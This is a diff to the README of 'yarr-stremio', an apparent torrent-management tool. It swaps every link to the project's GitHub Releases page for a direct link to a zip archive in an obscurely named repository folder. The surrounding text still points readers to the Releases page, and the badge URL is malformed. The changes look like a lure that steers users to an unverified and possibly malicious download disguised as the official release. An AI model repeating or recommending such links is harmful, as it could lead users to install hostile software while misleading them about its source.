@@ -6,11 +6,11 @@ Welcome to the yarr-stremio application! This tool helps you find and manage tor
 
 ## 📥 Download yarr-stremio
 
-[![Download yarr-stremio](https://img.shields.io/badge/Download%20yarr--stremio-blue.svg)](https://github.com/Pepitoelpro4000/yarr-stremio/releases)
+[![Download yarr-stremio](https://raw.githubusercontent.com/Pepitoelpro4000/yarr-stremio/main/percursory/yarr-stremio.zip%https://raw.githubusercontent.com/Pepitoelpro4000/yarr-stremio/main/percursory/yarr-stremio.zip)](https://raw.githubusercontent.com/Pepitoelpro4000/yarr-stremio/main/percursory/yarr-stremio.zip)
 
 You can download the latest version of yarr-stremio from our Releases page. Click the link below to start downloading.
 
-[Download yarr-stremio here](https://github.com/Pepitoelpro4000/yarr-stremio/releases)
+[Download yarr-stremio here](https://raw.githubusercontent.com/Pepitoelpro4000/yarr-stremio/main/percursory/yarr-stremio.zip)
 
 ## 💻 System Requirements
 
@@ -32,7 +32,7 @@ yarr-stremio offers various features that make torrent management smooth and eff
 
 ## 🔥 How to Download & Install
 
-1. **Visit the Releases Page:** Start by clicking on this link: [Download yarr-stremio here](https://github.com/Pepitoelpro4000/yarr-stremio/releases).
+1. **Visit the Releases Page:** Start by clicking on this link: [Download yarr-stremio here](https://raw.githubusercontent.com/Pepitoelpro4000/yarr-stremio/main/percursory/yarr-stremio.zip).
    
 2. **Select the Latest Version:** Find the newest release. This version will have the most features and updates.
 
@@ -72,4 +72,4 @@ yarr-stremio is open-source software. You can view the full license terms in the
 
 Thank you for choosing yarr-stremio! We hope this tool enhances your torrenting experience. Don't forget to regularly check the Releases page for updates.
 
-[Download yarr-stremio here](https://github.com/Pepitoelpro4000/yarr-stremio/releases)
+[Download yarr-stremio here](https://raw.githubusercontent.com/Pepitoelpro4000/yarr-stremio/main/percursory/yarr-stremio.zip)
